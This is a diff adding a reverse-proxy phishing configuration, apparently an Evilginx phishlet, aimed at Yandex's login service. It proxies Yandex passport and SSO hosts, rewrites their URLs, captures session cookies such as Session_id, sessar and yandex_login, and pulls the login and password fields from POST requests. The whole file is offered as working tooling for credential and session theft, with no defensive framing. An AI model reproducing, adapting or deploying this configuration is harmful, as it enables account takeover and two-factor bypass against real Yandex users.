@@ -1,0 +1,230 @@
+author: "sepht"
+min_ver: "3.0.0"
+proxy_hosts:
+  - {
+      phish_sub: "",
+      orig_sub: "",
+      domain: "ya.ru",
+      session: false,
+      is_landing: false,
+      auto_filter: true,
+    }
+  - {
+      phish_sub: "",
+      orig_sub: "",
+      domain: "yandex.ru",
+      session: false,
+      is_landing: false,
+      auto_filter: true,
+    }
+  - {
+      phish_sub: "",
+      orig_sub: "",
+      domain: "yastatic.net",
+      session: false,
+      is_landing: false,
+      auto_filter: true,
+    }
+  - {
+      phish_sub: "passport",
+      orig_sub: "passport",
+      domain: "yandex.ru",
+      session: true,
+      is_landing: true,
+    }
+  - {
+      phish_sub: "id",
+      orig_sub: "id",
+      domain: "yandex.ru",
+      session: false,
+      is_landing: false,
+    }
+  - {
+      phish_sub: "sso",
+      orig_sub: "sso",
+      domain: "ya.ru",
+      session: false,
+      is_landing: false,
+      auto_filter: true,
+    }
+  - {
+      phish_sub: "sso.passport",
+      orig_sub: "sso.passport",
+      domain: "yandex.ru",
+      session: false,
+      is_landing: false,
+    }
+
+sub_filters:
+  - {
+      triggers_on: "sso.passport.yandex.ru",
+      orig_sub: "sso.passport",
+      domain: "yandex.ru",
+      search: "https://{hostname}/prepare",
+      replace: "https://{hostname}/prepare",
+      mimes: ["text/html"],
+    }
+  - {
+      triggers_on: "sso.ya.ru",
+      orig_sub: "sso",
+      domain: "ya.ru",
+      search: "https://{hostname}/sync",
+      replace: "https://{hostname}/sync",
+      mimes: ["text/html", "application/json", "application/javascript"],
+    }
+  - {
+      triggers_on: "passport.yandex.ru",
+      orig_sub: "passport",
+      domain: "yandex.ru",
+      search: "https://{hostname}/",
+      replace: "https://{hostname}/",
+      mimes: ["text/html", "application/json", "application/javascript"],
+    }
+
+  - {
+      triggers_on: "passport.yandex.ru",
+      orig_sub: "passport",
+      domain: "yandex.ru",
+      search: "https://{hostname}/showcaptcha",
+      replace: "https://{hostname}/showcaptcha",
+      mimes: ["text/html", "application/json", "application/javascript"],
+    }
+
+  - {
+      triggers_on: "passport.yandex.ru",
+      orig_sub: "passport",
+      domain: "yandex.ru",
+      search: "https://{hostname}/",
+      replace: "https://{hostname}/",
+      mimes: ["text/html", "application/json", "application/javascript"],
+    }
+
+  - {
+      triggers_on: "passport.yandex.ru",
+      orig_sub: "passport",
+      domain: "yandex.ru",
+      search: "https://{hostname}/checkcaptcha",
+      replace: "https://{hostname}/checkcaptcha",
+      mimes: ["text/html", "application/json", "application/javascript"],
+    }
+
+  - {
+      triggers_on: "passport.yandex.ru",
+      orig_sub: "passport",
+      domain: "yandex.ru",
+      search: "https://{hostname}captchaimage",
+      replace: "https://{hostname}/showcaimage",
+      mimes: ["text/html", "application/json", "application/javascript"],
+    }
+
+  - {
+      triggers_on: "passport.yandex.ru",
+      orig_sub: "passport",
+      domain: "yandex.ru",
+      search: "https://{hostname}/auth",
+      replace: "https://{hostname}/auth",
+      mimes: ["text/html", "application/json", "application/javascript"],
+    }
+  - {
+      triggers_on: "passport.yandex.ru",
+      orig_sub: "passport",
+      domain: "yandex.ru",
+      search: "https://{hostname}/auth/",
+      replace: "https://{hostname}/auth/",
+      mimes: ["text/html", "application/json", "application/javascript"],
+    }
+  - {
+      triggers_on: "passport.yandex.ru",
+      orig_sub: "passport",
+      domain: "yandex.ru",
+      search: "https://{hostname}/redirect",
+      replace: "https://{hostname}/redirect",
+      mimes: ["text/html", "application/json", "application/javascript"],
+    }
+
+  - {
+      triggers_on: "passport.yandex.ru",
+      orig_sub: "passport",
+      domain: "yandex.ru",
+      search: "https://{hostname}/registration",
+      replace: "https://{hostname}/registration",
+      mimes: ["text/html", "application/json", "application/javascript"],
+    }
+
+  - {
+      triggers_on: "passport.yandex.ru",
+      orig_sub: "passport",
+      domain: "yandex.ru",
+      search: "https://{hostname}/registration-validations/auth/accounts",
+      replace: "https://{hostname}/registration-validations/auth/accounts",
+      mimes: ["text/html", "application/json", "application/javascript"],
+    }
+
+  - {
+      triggers_on: "passport.yandex.ru",
+      orig_sub: "passport",
+      domain: "yandex.ru",
+      search: "https://{hostname}/registration-validations/auth/additional_data/ask_v2",
+      replace: "https://{hostname}/registration-validations/auth/additional_data/ask_v2",
+      mimes: ["text/html", "application/json", "application/javascript"],
+    }
+
+  - {
+      triggers_on: "passport.yandex.ru",
+      orig_sub: "passport",
+      domain: "yandex.ru",
+      search: "https://{hostname}/registration-validations/auth/multi_step/commit_password",
+      replace: "https://{hostname}/registration-validations/auth/multi_step/commit_password",
+      mimes: ["text/html", "application/json", "application/javascript"],
+    }
+
+  - {
+      triggers_on: "passport.yandex.ru",
+      orig_sub: "passport",
+      domain: "yandex.ru",
+      search: "https://{hostname}/registration-validations/auth/multi_step/start",
+      replace: "https://{hostname}/registration-validations/auth/multi_step/start",
+      mimes: ["text/html", "application/json", "application/javascript"],
+    }
+
+auth_tokens:
+  - domain: ".ya.ru"
+    keys:
+      [
+        "i",
+        "receive-cookie-deprecation",
+        "L",
+        "is_gdpr",
+        "is_gdpr_b",
+        "yandexuid",
+        "ys",
+        "KIykI",
+        "yandex_login",
+        "_yasc",
+        "sso_status",
+        "yandex_csyr",
+        "Session_id",
+        "bltsr",
+        "font_loaded",
+        "mda2_beacon",
+        "my",
+        "sessar",
+        "yandex_gid",
+        "yashr",
+        "yp",
+      ]
+    type: "cookie"
+
+login:
+  domain: "passport.yandex.ru"
+  path: "/auth"
+
+credentials:
+  username:
+    key: "login"
+    search: "(.*)"
+    type: "post"
+  password:
+    key: "password"
+    search: "(.*)"
+    type: "post"
